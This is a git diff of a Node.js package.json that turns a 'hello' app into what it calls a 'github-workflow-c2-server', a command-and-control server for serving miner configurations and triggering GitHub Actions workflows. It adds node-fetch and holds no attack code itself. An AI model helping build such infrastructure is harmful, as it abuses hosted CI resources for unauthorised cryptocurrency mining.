@@ -1,20 +1,23 @@
 {
-  "name": "my-hello-app",
+  "name": "github-workflow-c2-server",
   "version": "1.0.0",
-  "description": "A simple Node.js app that returns 'Hello'",
-  "main": "index.js",
+  "description": "Combined C2 server to serve miner configs and trigger new GitHub Actions workflows.",
+  "main": "server.js",
   "scripts": {
     "start": "node server.js",
     "test": "echo \"Error: no test specified\" && exit 1"
   },
   "keywords": [
-    "hello",
+    "c2",
+    "github-actions",
+    "workflow",
     "node",
     "express"
   ],
   "author": "",
   "license": "ISC",
   "dependencies": {
-    "express": "^4.17.1"
+    "express": "^4.18.2",
+    "node-fetch": "^2.6.7"
   }
 }
